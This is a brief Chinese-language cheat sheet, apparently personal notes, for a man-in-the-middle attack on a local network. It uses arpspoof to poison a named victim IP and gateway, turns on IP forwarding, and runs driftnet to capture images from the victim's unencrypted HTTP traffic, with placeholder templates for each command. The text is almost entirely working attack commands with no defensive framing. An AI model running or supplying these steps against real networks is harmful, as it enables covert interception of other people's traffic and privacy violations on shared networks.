##  asp欺骗(虚拟机开启桥接模式) + driftnet监听网卡（只能看http的）

1. arpspoof -i eth0 -t 192.168.31.96 192.168.31.1
   1. arpspoof -i [kali网卡] -t [被监听IP] [被监听网关]
2. echo 1 >/proc/sys/net/ipv4/ip_forward
3. driftnet -i eth0
   1. driftnet -i [kali网卡]

